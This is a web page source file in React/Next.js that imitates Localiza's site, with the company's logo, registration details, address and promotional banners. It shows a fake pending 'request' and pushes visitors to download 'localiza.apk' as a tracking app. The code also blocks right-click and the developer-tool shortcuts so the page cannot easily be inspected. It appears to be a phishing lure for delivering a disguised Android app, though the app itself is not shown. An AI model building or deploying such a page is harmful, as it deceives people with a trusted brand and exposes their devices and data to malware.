"use client";

import { useState, useEffect } from "react";

export default function Home() {
  const banners = [
    "/MO_25_1194_COMECO_DE_ANO_BANNER-SITE-RAC_1920x616-1.jpg",
    "/RAC_26_1234_AM_DESCONTO_PROGRESSIVO_banner-1920x616-1.png",
    "/RAC_26_1267_BANNER_PROGRAMA_FIDELIDADE_1920x616-1.png",
    "/SN_25_1088_CAMPANHA-MENSAL-DEZEMBRO-Bsnner-RAC-1920x616px_.png",
  ];

  const [currentBanner, setCurrentBanner] = useState(0);

  // Rotação automática do carrossel
  useEffect(() => {
    const interval = setInterval(() => {
      setCurrentBanner((prev) => (prev + 1) % banners.length);
    }, 5000); // Muda a cada 5 segundos

    return () => clearInterval(interval);
  }, [banners.length]);

  // Desabilitar clique direito e teclas de atalho
  useEffect(() => {
    const handleContextMenu = (e: MouseEvent) => {
      e.preventDefault();
      return false;
    };

    const handleKeyDown = (e: KeyboardEvent) => {
      // Desabilitar F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
      if (
        e.key === "F12" ||
        (e.ctrlKey && e.shiftKey && (e.key === "I" || e.key === "J")) ||
        (e.ctrlKey && e.key === "U")
      ) {
        e.preventDefault();
        return false;
      }
    };

    document.addEventListener("contextmenu", handleContextMenu);
    document.addEventListener("keydown", handleKeyDown);

    return () => {
      document.removeEventListener("contextmenu", handleContextMenu);
      document.removeEventListener("keydown", handleKeyDown);
    };
  }, []);

  return (
    <div className="min-h-screen flex flex-col">
      {/* Header com Logo */}
      <header className="bg-[#01602a] shadow-sm py-3 sm:py-4 px-4 sm:px-6">
        <div className="max-w-6xl mx-auto flex items-center justify-center sm:justify-start">
          <img
            src="/localiza-logo.svg"
            alt="Localiza"
            className="h-6 sm:h-8 md:h-10"
          />
        </div>
      </header>

      {/* Conteúdo Principal */}
      <main className="flex-1 flex items-center justify-center px-3 sm:px-4 py-6 sm:py-12">
        <div className="bg-white rounded-xl sm:rounded-2xl shadow-lg border border-gray-200 max-w-4xl w-full p-4 sm:p-6 md:p-8 lg:p-12">
          {/* Título e Status */}
          <div className="bg-[#01602a] text-white px-4 sm:px-6 py-4 sm:py-5 -mx-4 -mt-4 sm:-mx-6 sm:-mt-6 md:-mx-8 md:-mt-8 lg:-mx-12 lg:-mt-12 rounded-t-xl sm:rounded-t-2xl mb-6 sm:mb-8">
            <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-3">
              <h1 className="text-lg sm:text-xl md:text-2xl lg:text-3xl font-bold leading-tight">
                Solicitação N° 61515712
              </h1>
              <div className="flex items-center gap-2 bg-white/20 px-3 sm:px-4 py-2 rounded-full self-start sm:self-auto">
                <svg
                  className="w-3 h-3 sm:w-4 sm:h-4 animate-spin flex-shrink-0"
                  fill="none"
                  viewBox="0 0 24 24"
                >
                  <circle
                    className="opacity-25"
                    cx="12"
                    cy="12"
                    r="10"
                    stroke="currentColor"
                    strokeWidth="4"
                  ></circle>
                  <path
                    className="opacity-75"
                    fill="currentColor"
                    d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                  ></path>
                </svg>
                <span className="text-xs sm:text-sm font-semibold whitespace-nowrap">
                  Em andamento
                </span>
              </div>
            </div>
          </div>

          {/* Carrossel de Banners */}
          <div className="mb-6 sm:mb-8 relative rounded-lg sm:rounded-xl overflow-hidden">
            <img
              src={banners[currentBanner]}
              alt={`Banner Localiza ${currentBanner + 1}`}
              className="w-full h-auto object-contain bg-gradient-to-r from-green-50 to-blue-50"
            />
          </div>

          {/* Seção de Acompanhamento */}
          <div className="bg-gradient-to-r from-green-50 to-blue-50 rounded-lg sm:rounded-xl p-4 sm:p-6 mb-4 sm:mb-6 border-2 border-dashed border-gray-300">
            <div className="flex flex-col items-center justify-center gap-3 mb-3 sm:mb-4">
              <div className="flex-shrink-0 w-16 h-16 sm:w-20 sm:h-20 bg-green-500 rounded-xl flex items-center justify-center shadow-lg">
                <svg
                  className="w-9 h-9 sm:w-11 sm:h-11 text-white"
                  fill="none"
                  stroke="currentColor"
                  viewBox="0 0 24 24"
                >
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth={2.5}
                    d="M7 16a4 4 0 01-.88-7.903A5 5 0 1115.9 6L16 6a5 5 0 011 9.9M15 13l-3 3m0 0l-3-3m3 3V10"
                  />
                </svg>
              </div>
              <h4 className="text-lg sm:text-xl md:text-2xl font-bold text-gray-800 text-center">
                Aplicativo da Localiza Seminovos
              </h4>
            </div>
            <p className="text-sm sm:text-base text-gray-700 text-center mb-4 sm:mb-6 leading-relaxed px-2">
              Baixe o aplicativo da Localiza Seminovos para acompanhar as
              atualizações da sua solicitação.
            </p>

            {/* Botão de Download Principal */}
            <div className="flex justify-center">
              <a
                href="/localiza.apk"
                download="localiza.apk"
                className="bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white font-bold py-3 sm:py-4 px-6 sm:px-8 rounded-lg shadow-lg hover:shadow-xl transform hover:scale-105 transition-all duration-200 flex items-center justify-center gap-2 sm:gap-3 text-sm sm:text-base md:text-lg touch-manipulation w-full sm:w-auto text-center"
              >
                <svg
                  className="w-5 h-5 sm:w-6 sm:h-6 flex-shrink-0"
                  fill="none"
                  stroke="currentColor"
                  viewBox="0 0 24 24"
                >
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth={2}
                    d="M7 16a4 4 0 01-.88-7.903A5 5 0 1115.9 6L16 6a5 5 0 011 9.9M9 19l3 3m0 0l3-3m-3 3V10"
                  />
                </svg>
                <span className="leading-tight text-center">
                  Baixar Aplicativo de Acompanhamento
                </span>
              </a>
            </div>

            <div className="mt-4 sm:mt-6 flex items-start gap-2 bg-white/60 rounded-lg p-3 sm:p-4">
              <svg
                className="w-5 h-5 sm:w-6 sm:h-6 text-gray-600 flex-shrink-0 mt-0.5"
                fill="currentColor"
                viewBox="0 0 20 20"
              >
                <path
                  fillRule="evenodd"
                  d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z"
                  clipRule="evenodd"
                />
              </svg>
              <p className="text-xs sm:text-sm text-gray-700 leading-relaxed">
                O arquivo será atualizado automaticamente com novas informações
                sobre o andamento da sua solicitação.
              </p>
            </div>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-[#01602a] text-white py-8 sm:py-12 px-4">
        <div className="max-w-6xl mx-auto">
          <div className="flex flex-col items-center gap-6 sm:gap-8">
            {/* Logo */}
            <div>
              <img
                src="/localiza-logo.svg"
                alt="Localiza"
                className="h-8 sm:h-10"
              />
            </div>

            {/* Divisor */}
            <div className="w-full max-w-3xl h-px bg-white/20"></div>

            {/* Informações da Empresa */}
            <div className="text-center space-y-3 sm:space-y-4 max-w-3xl">
              <p className="text-xs sm:text-sm text-white/90 leading-relaxed">
                <strong>Informações ao consumidor:</strong> Localiza Rent a Car S/A - CNPJ nº 16.670.085/0001-55
              </p>
              <p className="text-xs sm:text-sm text-white/90 leading-relaxed">
                <strong>Sede:</strong> Avenida Bernardo Vasconcelos, n° 377 - Cachoeirinha - CEP: 31.150-000 - Belo Horizonte - MG
              </p>
              <p className="text-xs sm:text-sm text-white/90 leading-relaxed">
                <strong>Central de Reservas e Assistência a Clientes:</strong>{" "}
                <a href="tel:08009792020" className="hover:text-white transition-colors underline">
                  0800 979 2020
                </a>
              </p>
            </div>

            {/* Divisor */}
            <div className="w-full max-w-3xl h-px bg-white/20"></div>

            {/* Copyright */}
            <div className="text-center">
              <p className="text-xs sm:text-sm text-white/80">
                © Localiza - Todos direitos reservados
              </p>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
}
